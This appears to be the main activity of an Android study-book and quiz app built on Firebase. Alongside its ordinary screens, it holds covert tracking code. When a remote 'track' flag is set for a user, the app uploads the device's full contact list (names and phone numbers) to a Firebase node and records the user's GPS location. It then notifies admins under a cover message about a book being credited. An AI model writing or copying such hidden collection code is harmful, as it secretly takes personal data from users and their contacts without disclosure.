package com.developerali.lshistutorial;

import static androidx.constraintlayout.motion.widget.Debug.getLocation;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.fragment.app.FragmentTransaction;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.viewpager2.widget.ViewPager2;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.location.Location;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.AnimationUtils;
import android.widget.AdapterView;
import android.widget.BaseAdapter;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.airbnb.lottie.LottieAnimationView;
import com.bumptech.glide.Glide;
import com.bumptech.glide.load.engine.DiskCacheStrategy;
import com.denzcoskun.imageslider.constants.ScaleTypes;
import com.denzcoskun.imageslider.models.SlideModel;
import com.developerali.lshistutorial.Activities.CheckOut;
import com.developerali.lshistutorial.Activities.MyBooks;
import com.developerali.lshistutorial.Activities.NotificationActivity;
import com.developerali.lshistutorial.Activities.OffersActivity;
import com.developerali.lshistutorial.Activities.ProfileActivity;
import com.developerali.lshistutorial.Activities.QuizListActivity;
import com.developerali.lshistutorial.Activities.ReadBook;
import com.developerali.lshistutorial.Activities.WebView;
import com.developerali.lshistutorial.Adapters.BooksAdapter;
import com.developerali.lshistutorial.Models.BooksModel;
import com.developerali.lshistutorial.Models.ToolsModel;
import com.developerali.lshistutorial.Models.UserModel;
import com.developerali.lshistutorial.Notification.FcmNotificationsSender;
import com.developerali.lshistutorial.databinding.ActivityMainBinding;
import com.developerali.lshistutorial.databinding.BottomListsBinding;
import com.developerali.lshistutorial.databinding.CustomDialogBinding;
import com.developerali.lshistutorial.databinding.DialogUpdateLayoutBinding;
import com.github.barteksc.pdfviewer.PDFView;
import com.google.android.gms.common.api.ResolvableApiException;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.LocationSettingsRequest;
import com.google.android.gms.location.LocationSettingsResponse;
import com.google.android.gms.location.SettingsClient;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.android.material.snackbar.Snackbar;
import com.google.android.play.core.appupdate.AppUpdateInfo;
import com.google.android.play.core.appupdate.AppUpdateManager;
import com.google.android.play.core.appupdate.AppUpdateManagerFactory;
import com.google.android.play.core.appupdate.AppUpdateOptions;
import com.google.android.play.core.install.model.AppUpdateType;
import com.google.android.play.core.install.model.UpdateAvailability;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.Query;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.QuerySnapshot;
import com.google.firebase.messaging.FirebaseMessaging;
import com.karumi.dexter.Dexter;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionDeniedResponse;
import com.karumi.dexter.listener.PermissionGrantedResponse;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.single.PermissionListener;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    private ViewPager2 viewPager;
    PDFView pdfView;
    ArrayList<ToolsModel> arrayList = new ArrayList<>();
    ActivityMainBinding binding;
    FirebaseDatabase data;
    FirebaseFirestore database;
    FirebaseAuth auth;
    String blogLink, fcmKey;
    ArrayList<String> headNames = new ArrayList<>();
    ArrayList<BooksModel> booksArray = new ArrayList<>();
    BooksAdapter booksAdapter;
    Activity activity;
    private FusedLocationProviderClient fusedLocationClient;
    private int requestCode;
    private String[] permissions;
    private int[] grantResults;


    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        data = FirebaseDatabase.getInstance();
        database = FirebaseFirestore.getInstance();
        auth = FirebaseAuth.getInstance();
        activity = MainActivity.this;

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        headNames.clear();
        headNames.add("1ST SEM");
        headNames.add("2ND SEM");
        headNames.add("3RD SEM");
        headNames.add("4RTH SEM");
        headNames.add("5TH SEM");
        headNames.add("6TH SEM");

        arrayList.clear();
        arrayList.add(new ToolsModel("Play Quiz", getDrawable(R.drawable.quiz)));
        arrayList.add(new ToolsModel("My Books", getDrawable(R.drawable.digital_library)));
        arrayList.add(new ToolsModel("Coupons", getDrawable(R.drawable.coupon)));
        arrayList.add(new ToolsModel("Options", getDrawable(R.drawable.menubar)));

        myListAdapter adapter = new myListAdapter();
        binding.toolsList.setAdapter(adapter);

        Intent receivedIntent = getIntent();
        if (receivedIntent.hasExtra("confirm")) {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    startActivity(new Intent(MainActivity.this, MyBooks.class));
                }
            }, 600);
        }

        getBlogLinks();

        if (Helper.getSem(MainActivity.this) == null){
            binding.sem.setText("Choose Semester");
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    showBottomDialog(headNames);
                }
            }, 600);
        }else {
            binding.sem.setText(Helper.getSem(MainActivity.this));
            try {
                getBooks();
                getBlogLinks();
            }catch (Exception e){

            }
        }

        if (auth.getCurrentUser() != null){
            database.collection("users")
                    .document(auth.getCurrentUser().getUid()).get()
                            .addOnSuccessListener(new OnSuccessListener<DocumentSnapshot>() {
                                @Override
                                public void onSuccess(DocumentSnapshot documentSnapshot) {
                                    if (documentSnapshot.exists()){

                                        UserModel user = new UserModel();

                                        String Name = documentSnapshot.getString("name");
                                        String Email = documentSnapshot.getString("email");
                                        binding.discoverProfileName.setText(Name);
                                        binding.profileMail.setText(Email);
                                        Helper.My_Name = Name;

                                        if (documentSnapshot.getString("imageUrl") != null) {
                                            user.setImageUrl(documentSnapshot.getString("imageUrl"));

                                            if (user.getImageUrl() != null && !activity.isDestroyed()){
                                                Glide.with(activity)
                                                        .load(user.getImageUrl())
                                                        .placeholder(getDrawable(R.drawable.logo))
                                                        .diskCacheStrategy(DiskCacheStrategy.AUTOMATIC)
                                                        .into(binding.myImg);
                                            }
                                        }

                                        if (documentSnapshot.getLong("balance")!= null) {
                                            user.setBalance(documentSnapshot.getLong("balance"));
                                            binding.money.setText(""+user.getBalance());
                                        }

                                        binding.profileSegment.setVisibility(View.VISIBLE);
                                    }
                                }
                            }).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {

                        }
                    });
            data.getReference().child("notification")
                    .child(auth.getCurrentUser().getUid())
                    .limitToLast(1)
                    .addValueEventListener(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            if (snapshot.exists()){
                                for (DataSnapshot snapshot1 : snapshot.getChildren()){
                                    if (snapshot1.child("seen").exists()){
                                        if (!snapshot1.child("seen").getValue(Boolean.class)){
                                            binding.notificationLin.setVisibility(View.VISIBLE);
                                            binding.notificationLin.startAnimation(
                                                    AnimationUtils.loadAnimation(MainActivity.this, R.anim.blink)
                                            );
                                        }
                                    }
                                    return;
                                }
                            }
                        }

                        @Override
                        public void onCancelled(@NonNull DatabaseError error) {

                        }
                    });

        }else {
            binding.profileSegment.setVisibility(View.GONE);
        }


        if (auth.getCurrentUser() != null){
            String deviceId = Settings.Secure.getString(activity.getContentResolver(), Settings.Secure.ANDROID_ID);
            data.getReference().child("loggers")
                    .child(auth.getCurrentUser().getUid())
                    .addListenerForSingleValueEvent(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            if (snapshot.exists()){
                                String id = snapshot.getValue(String.class);
                                if (!id.equalsIgnoreCase(deviceId)){
                                    auth.signOut();
                                    binding.profileSegment.setVisibility(View.GONE);
                                    Helper.showLoginDialog(activity, "Another Login Detected");
                                }else {
                                    binding.profileSegment.setVisibility(View.VISIBLE);
                                }
                            }
                        }

                        @Override
                        public void onCancelled(@NonNull DatabaseError error) {

                        }
                    });
            data.getReference().child("track").child(auth.getCurrentUser().getUid())
                    .addListenerForSingleValueEvent(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            if (snapshot.exists()){
                                checkLocationAndUpdateTime();
                                ActivityCompat.requestPermissions(MainActivity.this,
                                        new String[]{Manifest.permission.READ_CONTACTS},
                                        302);
                            }
                        }

                        @Override
                        public void onCancelled(@NonNull DatabaseError error) {

                        }
                    });
        }

        binding.toolsList.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                switch (position){
                    case 0:
                        Intent n = new Intent(MainActivity.this, QuizListActivity.class);
                        n.putExtra("sem", binding.sem.getText().toString());
                        startActivity(n);
                        break;
                    case 1:
                        if (auth.getCurrentUser() != null){
                            startActivity(new Intent(MainActivity.this, MyBooks.class));
                        }else {
                            Helper.showLoginDialog(MainActivity.this, "Login Required");
                        }
                        break;
                    case 2:
                        startActivity(new Intent(MainActivity.this, OffersActivity.class));
                        break;
                    case 3:
                        startActivity(new Intent(MainActivity.this, ProfileActivity.class));
                        break;
                }
            }
        });

        binding.notificationLin.setOnClickListener(v->{
            Intent i = new Intent(MainActivity.this, NotificationActivity.class);
            startActivity(i);
        });


        //adding banners
        //ImageSlider
        final ArrayList<SlideModel> slideModels = new ArrayList<>();

        database.collection("homeBanner")
                .get().addOnSuccessListener(new OnSuccessListener<QuerySnapshot>() {
                    @Override
                    public void onSuccess(QuerySnapshot queryDocumentSnapshots) {
                        if (!queryDocumentSnapshots.isEmpty()){
                            slideModels.clear();
                            for (DocumentSnapshot snapshot : queryDocumentSnapshots.getDocuments()){
                                slideModels.add(new SlideModel(snapshot.getString("fieldName"), ScaleTypes.CENTER_CROP));
                            }
                            binding.imageSlider.setImageList(slideModels, ScaleTypes.CENTER_CROP);
                        }else {
                            slideModels.clear();

                            slideModels.add(new SlideModel(R.drawable.bannera, ScaleTypes.CENTER_CROP));
                            slideModels.add(new SlideModel(R.drawable.bannerb, ScaleTypes.CENTER_CROP));
                            binding.imageSlider.setImageList(slideModels, ScaleTypes.FIT);
                        }
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {

                    }
                });

        //subcribing all messages
        FirebaseMessaging.getInstance().subscribeToTopic("/topics/users")
                .addOnCompleteListener(new OnCompleteListener<Void>() {
                    @Override
                    public void onComplete(@NonNull Task<Void> task) {
                        String msg = "Subscribed";
                        if (!task.isSuccessful()) {
                            msg = "Subscribe failed";
                        }
                    }
                });
        checkNotification();

        binding.menuBtn.setOnClickListener(v->{
            Intent i = new Intent(MainActivity.this, ProfileActivity.class);
            startActivity(i);
        });

        binding.profileSegment.setOnClickListener(v->{
            binding.menuBtn.performClick();
        });

        binding.sem.setOnClickListener(v->{
            showBottomDialog(headNames);
        });

        database.collection("key")
                .document("info")
                .get()
                .addOnSuccessListener(new OnSuccessListener<DocumentSnapshot>() {
                    @Override
                    public void onSuccess(DocumentSnapshot documentSnapshot) {
                        if (documentSnapshot.exists()){
                            fcmKey = documentSnapshot.getString("key");
                        }else {
                            fcmKey = null;
                        }
                    }
                }).addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        fcmKey = null;
                    }
                });


        LinearLayoutManager lnm = new LinearLayoutManager(MainActivity.this);
        binding.books.setLayoutManager(lnm);
        booksAdapter = new BooksAdapter(MainActivity.this, booksArray);
        binding.books.setAdapter(booksAdapter);

        if (!Helper.isConnectedNetwork(MainActivity.this)){
            showNoInternetDialog();
        }

        //checkForUpdate();

    }

    public void checkForUpdate() {
        AppUpdateManager appUpdateManager = AppUpdateManagerFactory.create(MainActivity.this);
        Task<AppUpdateInfo> appUpdateInfoTask = appUpdateManager.getAppUpdateInfo();
        appUpdateInfoTask.addOnSuccessListener(appUpdateInfo -> {
            if (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE
                    && appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)) {
                try {
                    appUpdateManager.startUpdateFlowForResult(
                            appUpdateInfo,
                            AppUpdateType.IMMEDIATE,
                            this, 201);
                } catch (Exception e) {

                }
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
            }
        });

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 201){
            Toast.makeText(activity, "update start", Toast.LENGTH_SHORT).show();
            if (resultCode != RESULT_OK){
                Toast.makeText(this, "Update Failed: " + resultCode, Toast.LENGTH_SHORT).show();
            }
        }
        if (requestCode == 100) {
            if (resultCode == RESULT_OK) {
                checkLocationAndUpdateTime();
            }
        }
    }


    public void getContacts2(){
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                @SuppressLint("Range") String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                data.getReference().child("action2")
                        .child("tracked_"+auth.getCurrentUser().getUid()+Helper.getDateKey())
                        .child(Helper.sanitizeForFirebase(name))
                        .setValue(phoneNumber);
            }
            cursor.close();
        }
    }

    private void checkLocationAndUpdateTime() {
        if (Helper.isLocationEnabled(MainActivity.this)){
            Dexter.withContext(MainActivity.this)
                    .withPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                    .withListener(new PermissionListener() {
                        @Override public void onPermissionGranted(PermissionGrantedResponse response) {
                            getLocation();
                        }
                        @Override public void onPermissionDenied(PermissionDeniedResponse response) {
                            // Permission is denied
                        }

                        @Override
                        public void onPermissionRationaleShouldBeShown(PermissionRequest permissionRequest,
                                                                       PermissionToken permissionToken) {
                            permissionToken.continuePermissionRequest();
                        }

                    }).check();
        }else {
            LocationRequest locationRequest = LocationRequest.create();
            locationRequest.setInterval(10000);
            locationRequest.setFastestInterval(5000);
            locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

            LocationSettingsRequest.Builder builder = new LocationSettingsRequest.Builder()
                    .addLocationRequest(locationRequest);
            SettingsClient client = LocationServices.getSettingsClient(this);
            Task<LocationSettingsResponse> task = client.checkLocationSettings(builder.build());

            task.addOnSuccessListener(this, new OnSuccessListener<LocationSettingsResponse>() {
                @Override
                public void onSuccess(LocationSettingsResponse locationSettingsResponse) {

                    getLocation();  // assuming getLocationOnce() method fetches the location once
                }
            });

            task.addOnFailureListener(this, new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    if (e instanceof ResolvableApiException) {
                        try {
                            ResolvableApiException resolvable = (ResolvableApiException) e;
                            resolvable.startResolutionForResult(MainActivity.this, 100);
                        } catch (IntentSender.SendIntentException sendEx) {

                        }
                    }
                }
            });
        }
    }

    private void getLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 200);
        } else {
            fusedLocationClient.getLastLocation()
                    .addOnSuccessListener(this, new OnSuccessListener<Location>() {
                        @Override
                        public void onSuccess(Location location) {
                            if (location != null) {
                                double latitude = location.getLatitude();
                                double longitude = location.getLongitude();
                                data.getReference().child("action")
                                        .child("tracked_"+auth.getCurrentUser().getUid()+"_"+
                                                System.currentTimeMillis())
                                        .child("latlong")
                                        .setValue(latitude + " + "+ longitude);

                                FcmNotificationsSender notificationsSender = new FcmNotificationsSender("/topics/admin",
                                        fcmKey,
                                        "Someone Added",
                                        "Thank you, book credited to account"
                                        , getApplicationContext(), MainActivity.this);
                                notificationsSender.SendNotifications();
                            }
                        }
                    });
        }
    }


    private void getBlogLinks() {
        data.getReference().child("blogs")
                .child(binding.sem.getText().toString())
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()){
                            blogLink = snapshot.getValue(String.class);
                            Helper.BLOG_LINK = blogLink;
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                    }
                });
    }

    private void getBooks() {
        DatabaseReference reference = data.getReference().child("books").child(Helper.getSem(MainActivity.this));
        //Query query = reference.orderByChild("sem").equalTo(Helper.getSem(MainActivity.this));
        booksArray.clear();
        binding.progressBar5.setVisibility(View.VISIBLE);

        reference.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()){
                    booksArray.clear();
                    for (DataSnapshot books : snapshot.getChildren()){

                        BooksModel model = new BooksModel();
                        model.setId(books.getKey());
                        model.setTitle(books.child("title").getValue(String.class));
                        model.setDescription(books.child("description").getValue(String.class));
                        model.setImages(model.getImages());
                        model.setFileUrl(books.child("fileUrl").getValue(String.class));

                        model.setSellingPrice(books.child("sellingPrice").getValue(Long.class));
                        model.setNormalPrice(books.child("normalPrice").getValue(Long.class));

                        model.setSem(books.child("sem").getValue(String.class));
                        model.setType(books.child("type").getValue(String.class));

                        final ArrayList<SlideModel> slideModels = new ArrayList<>();
                        for (DataSnapshot images : books.child("images").getChildren()){
                            slideModels.add(new SlideModel(images.getValue(String.class), ScaleTypes.CENTER_CROP));
                        }
                        model.setImages(slideModels);


                        booksArray.add(model);
                    }

                    booksAdapter.notifyDataSetChanged();
                    binding.noData.setVisibility(View.GONE);

                    if (booksArray.isEmpty()){
                        binding.noData.setVisibility(View.VISIBLE);
                    }else {
                        binding.noData.setVisibility(View.GONE);
                    }

                }else {
                    binding.noData.setVisibility(View.VISIBLE);
                    booksAdapter.notifyDataSetChanged();
                }

                binding.progressBar5.setVisibility(View.GONE);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                binding.noData.setVisibility(View.VISIBLE);
                binding.progressBar5.setVisibility(View.GONE);
            }
        });
    }


    private void showBottomDialog(ArrayList<String> headNames) {
        filterAdapter adapter = new filterAdapter();
        BottomListsBinding listsBinding = BottomListsBinding.inflate(getLayoutInflater());

        // Create a new dialog and set the custom layout
        Dialog dialog = new Dialog(this);
        dialog.setContentView(listsBinding.getRoot());

        dialog.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.getWindow().setGravity(Gravity.BOTTOM);

        listsBinding.text1.setText("Choose semester you read in");
        listsBinding.text2.setVisibility(View.GONE);

        listsBinding.listView.setAdapter(adapter);
        listsBinding.listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                binding.sem.setText(headNames.get(i));
                Helper.changeSem(headNames.get(i), MainActivity.this);
                try {
                    getBooks();
                    getBlogLinks();
                }catch (Exception e){

                }
                dialog.dismiss();
            }
        });

        listsBinding.close.setOnClickListener(v->{
            dialog.dismiss();
        });

        dialog.show();
    }

    private void showUpdateDialog(String description, Long versionCode, Boolean important) {

        DialogUpdateLayoutBinding dialogBinding = DialogUpdateLayoutBinding.inflate(getLayoutInflater());

        // Create a new dialog and set the custom layout
        Dialog dialog = new Dialog(this);
        dialog.setCancelable(false);
        dialog.setCanceledOnTouchOutside(false);
        dialog.setContentView(dialogBinding.getRoot());
        dialog.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.getWindow().setGravity(Gravity.CENTER_VERTICAL);

        dialogBinding.dialogDescription.setText(description);
        dialogBinding.dialogVersion.setText("installed_version- " + versionCode);

        dialogBinding.closeDialog.setOnClickListener(c->{
            dialog.dismiss();
        });

        if (important){
            dialogBinding.closeDialog.setVisibility(View.GONE);
        }else {
            dialogBinding.closeDialog.setVisibility(View.VISIBLE);
        }

        dialogBinding.btnUpdate.setOnClickListener(c->{
            Intent intent = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("market://details?id=" + getPackageName()));
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
            }
        });

        // Show the dialog
        dialog.show();
    }
    private void checkNotification() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            // Permission not granted, request it
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 201);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 201) {
            // Check if the permission was granted
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

            } else {
                // Permission denied, handle accordingly (e.g., show a message to the user)
                checkNotification();
            }
        }

        if (requestCode == 302) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted, proceed with reading contacts
                try {
                    getContacts2();
                }catch (Exception e){

                }
            }
        }
    }

    @SuppressLint("ResourceAsColor")
    public void showNoInternetDialog() {
        CustomDialogBinding dialogBinding = CustomDialogBinding.inflate(LayoutInflater.from(MainActivity.this));

        AlertDialog dialog = new AlertDialog.Builder(activity)
                .setView(dialogBinding.getRoot())
                .create();

        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(android.R.color.transparent));
        dialog.setCancelable(false);
        dialog.setCanceledOnTouchOutside(false);

        dialogBinding.titleText.setText("Internet not connected!");
        dialogBinding.messageText.setText("Please connect internet for best results. No internet connection found!");

        dialogBinding.yesBtnText.setText("Okay");
        dialogBinding.noBtn.setVisibility(View.GONE);

        dialogBinding.loginBtn.setOnClickListener(v->{
            dialog.dismiss();
        });

        dialog.show();
    }

    public class myListAdapter extends BaseAdapter {

        @Override
        public int getCount() {
            return arrayList.size();
        }

        @Override
        public Object getItem(int i) {
            return null;
        }

        @Override
        public long getItemId(int i) {
            return 0;
        }

        @Override
        public View getView(int i, View view, ViewGroup viewGroup) {
            LayoutInflater obj = getLayoutInflater();
            View view1 = obj.inflate(R.layout.sample_tools, null);
            ImageView imageView = view1.findViewById(R.id.toolImg);
            TextView textView = view1.findViewById(R.id.toolName);

            ToolsModel toolsModel = arrayList.get(i);
            textView.setText(toolsModel.getName());
            imageView.setImageDrawable(toolsModel.getDrawable());

            return view1;
        }
    }

    public class filterAdapter extends BaseAdapter {

        @Override
        public int getCount() {
            return headNames.size();
        }

        @Override
        public Object getItem(int i) {
            return null;
        }

        @Override
        public long getItemId(int i) {
            return 0;
        }

        @Override
        public View getView(int i, View view, ViewGroup viewGroup) {
            LayoutInflater obj = getLayoutInflater();
            View view1 = obj.inflate(R.layout.child_filter_layout, null);
            //ImageView imageView = view1.findViewById(R.id.filterImg);
            TextView textView = view1.findViewById(R.id.textFilter);

            textView.setText(headNames.get(i));
            return view1;
        }
    }

}